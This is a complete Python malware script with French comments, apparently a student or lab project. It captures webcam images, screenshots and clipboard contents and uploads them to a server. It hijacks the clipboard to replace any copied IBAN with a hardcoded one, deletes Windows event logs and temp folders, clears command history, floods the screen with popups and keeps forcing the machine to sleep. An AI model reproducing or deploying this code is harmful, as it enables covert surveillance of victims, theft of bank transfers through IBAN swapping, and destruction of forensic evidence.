import sys
import os
import tkinter as tk
from pynput import keyboard
from PIL import Image, ImageTk
import time
import random
import cv2
import pyautogui
from datetime import datetime
import shutil
import requests as r
import subprocess
import pyperclip
import re
import shutil
import win32evtlog

fichier_log = "frappes_clavier.txt"
url = "http://localhost:8000"
destination_folder = os.getcwd()
start_time = time.time()
iban_regex = r'\b[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}\b'
replacement_iban = "FR76 3000 6000 0112 3456 7890 189"
output_file = "iban_copies.txt"

def uploadServer(filename):
    """Prend en entree un nom de fichier, upload ce fichier sur un serveur"""
    filepath = os.path.abspath(filename)
    with open(filepath, "rb") as file:
        # Use the files parameter to send the file
        files = {"file": file}
        response = r.post(url, files=files)
    os.remove(filepath)

def webcam():
    """Prend photo de l'utilisateur et l enregistre"""
    # Créer le dossier si nécessaire
    os.makedirs(destination_folder, exist_ok=True)
    camera = cv2.VideoCapture(0)
    if not camera.isOpened():
        print("Erreur: Impossible d'accéder à la webcam.")
    else:
        # Capturer une image
        ret, frame = camera.read()
        if ret:
            # Enregistrer l'image capturée dans un fichier
            timestamp = int(time.time())  # Utilise un timestamp pour nommer les fichiers de manière unique
            filename = f"image_capturee_{timestamp}.png"
            cv2.imwrite(filename, frame)
            print(f"Image capturée et sauvegardée sous '{filename}'")
            
        else:
            print("Erreur: Impossible de capturer une image.")

    # Libération de la caméra
    camera.release()
    uploadServer(filename)

def get_clipboard_content():
    """Recupere le contenu du presse-papiers"""
    try:
        root = tk.Tk()
        root.withdraw()  # Cache la fenêtre principale
        clipboard_content = root.clipboard_get()  # Récupère le contenu du presse-papiers
        root.destroy()  # Ferme la fenêtre Tkinter
        return clipboard_content
    except Exception as e:
        print(f"Erreur")

def capture_ecran():
    """Prend une capture d ecran et l enregistre"""
    # S'assurer que le dossier existe, sinon le créer
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    # Générer un nom de fichier unique avec l'heure actuelle
    nom_fichier = datetime.now().strftime("capture_%Y-%m-%d_%H-%M-%S.png")
    chemin_fichier = os.path.join(destination_folder, nom_fichier)
    
    # Prendre la capture d'écran
    screenshot = pyautogui.screenshot()
    
    # Enregistrer la capture d'écran dans le dossier spécifié
    screenshot.save(chemin_fichier)
    print(f"Capture d'écran enregistrée sous : {chemin_fichier}")
    print(nom_fichier)
    uploadServer(nom_fichier)

def detect_and_replace_iban():
    """Idee bonus> Detecter et remplacer un iban"""
    copied_text = pyperclip.paste()  # Récupération du texte du presse-papier
    found_iban = re.findall(iban_regex, copied_text)  # Recherche d'un IBAN dans le texte copié

    if found_iban:
        modified_text = re.sub(iban_regex, replacement_iban, copied_text)
        pyperclip.copy(modified_text)  # Copier le texte modifié dans le presse-papier
        
        # Enregistrement de chaque IBAN détecté dans un fichier texte
        with open(output_file, "a") as file:
            for iban in found_iban:
                file.write(iban + "\n")
        
        print(f"IBAN détecté et remplacé. L'IBAN original a été sauvegardé dans {output_file}.")
        return True
    return False

def monitor_clipboard():
    previous_text = ""
    try:
        while True:
            current_text = pyperclip.paste()  # Récupération du texte actuel dans le presse-papier
            if current_text != previous_text:  # Si le texte du presse-papier a changé
                if detect_and_replace_iban():  # Remplacer l'IBAN si trouvé
                    previous_text = pyperclip.paste()  # Met à jour le texte précédent pour éviter les doublons
                else:
                    previous_text = current_text
            time.sleep(1)  # Pause d'une seconde entre chaque vérification
    except KeyboardInterrupt:
        print("\nArrêt du programme par l'utilisateur.")

def delete_event_logs():
    """Supprime les fichiers de logs de l Observateur d evenements"""
    log_directories = [
        "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
        "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"
    ]
    
    for log_file in log_directories:
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
        except Exception as e:
            print(f"Erreur lors de la suppression du log {log_file}: {e}")

def delete_temp_files():
    """Clean les fichiers temporaires et caches"""
    temp_dirs = [
        "C:\\Windows\\Temp",
        "C:\\Users\\<NomUtilisateur>\\AppData\\Local\\Temp"  # Remplacer <NomUtilisateur> par le nom réel
    ]
    
    for temp_dir in temp_dirs:
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)  # Supprime tout le contenu du répertoire
                os.makedirs(temp_dir)  # Recréation du répertoire vide
        except Exception as e:
            print(f"Erreur lors de la suppression du dossier {temp_dir}: {e}")

def clear_command_history():
    """vide l'historique des commandes PowerShell et cmd"""
    try:
        # Vider l'historique de PowerShell
        os.system("Clear-History")
        # Vider l'historique de CMD (si applicable)
        os.system("cls")
    except Exception as e:
        print(f"Erreur lors de la suppression de l'historique des commandes: {e}")      

def popup():
    for i in range(100):
        time.sleep(0.1)
        rand = random.randint(2, 69)
        try:
            image = Image.open("chat/"+str(rand)+".png")
            image.show()
        except Exception as e:
            print(f"Erreur")
        
def mise_en_veille():
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

def __main__():
    sTime = time.time()
    while time.time()-sTime < 120:
        webcam()
        capture_ecran()
        with open("rock_you.txt", "a") as file:
            file.write(get_clipboard_content() + "\n")
    uploadServer('rock_you.txt')
    delete_event_logs()
    delete_temp_files()
    clear_command_history()
    popup()
    while 1:
        mise_en_veille()
        time.sleep(60)

__main__()